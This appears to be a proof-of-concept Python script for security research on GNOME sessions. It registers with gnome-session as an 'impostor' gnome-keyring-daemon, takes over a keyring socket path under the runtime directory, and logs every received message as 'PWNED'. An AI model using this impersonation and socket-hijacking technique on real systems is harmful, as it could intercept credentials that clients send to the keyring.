# Based on https://stackoverflow.com/a/58528177/160386
from pathlib import Path
# from socketserver import UnixStreamServer, StreamRequestHandler, ThreadingMixIn
from socketserver import UnixStreamServer, BaseRequestHandler, ThreadingMixIn
import os
import stat
import subprocess
import syslog

# Register with gnome-session. Not sure if it is necessary.
app_id = "gnome-keyring-daemon"
client_id = os.getenv("DESKTOP_AUTOSTART_ID")

if client_id:
    command = [
        # "${pkgs.glib.bin}/bin/gdbus", "call",
        "gdbus", "call",
        "--session",
        "--dest", "org.gnome.SessionManager",
        "--object-path", "/org/gnome/SessionManager",
        "--method", "org.gnome.SessionManager.RegisterClient",
        "--",
        app_id,
        client_id,
    ]

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout.strip()
        syslog.syslog(f"registered impostor with gnome-session: {output}")
    except subprocess.CalledProcessError as e:
        syslog.syslog(f"couldn't register in session: {e.stderr}")
        exit()

# Take over the control socket
xdg_runtime_dir = Path(os.environ.get('XDG_RUNTIME_DIR'))
sock_path = xdg_runtime_dir / 'keyring/foo'
sock_path.parent.mkdir(parents=True, exist_ok=True)

sock_path.unlink(missing_ok=True)

# class Handler(StreamRequestHandler):
class Handler(BaseRequestHandler):
    def handle(self):
        while True:
            # msg = self.rfile.readline().strip()
            msg = self.request.recv(1024)
            if msg:
                syslog.syslog(f"PWNED: '{msg}'")
            else:
                return

class ThreadedUnixStreamServer(ThreadingMixIn, UnixStreamServer):
    pass

with ThreadedUnixStreamServer(str(sock_path), Handler) as server:
    syslog.syslog(f"Starting socket on {sock_path}")

    try:
        # Perform lstat on the path
        file_stat = os.lstat(sock_path)

        # Check if it's a socket
        if stat.S_ISSOCK(file_stat.st_mode):
            syslog.syslog(f"{sock_path} is a socket")
        else:
            syslog.syslog(f"{sock_path} is not a socket")

        # Check if it's a symbolic link
        if stat.S_ISLNK(file_stat.st_mode):
            syslog.syslog(f"{sock_path} is a symbolic link")
        else:
            syslog.syslog(f"{sock_path} is not a symbolic link")

        # Other checks can be performed using the `file_stat` attributes
        # For example, check ownership
        syslog.syslog(f"Owner UID: {file_stat.st_uid}")
        syslog.syslog(f"File mode: {file_stat.st_mode}")

    except FileNotFoundError:
        syslog.syslog(f"{sock_path} does not exist")
    except PermissionError:
        syslog.syslog(f"Permission denied when accessing {sock_path}")
    except OSError as e:
        syslog.syslog(f"Error accessing {sock_path}: {e}")

    server.serve_forever()
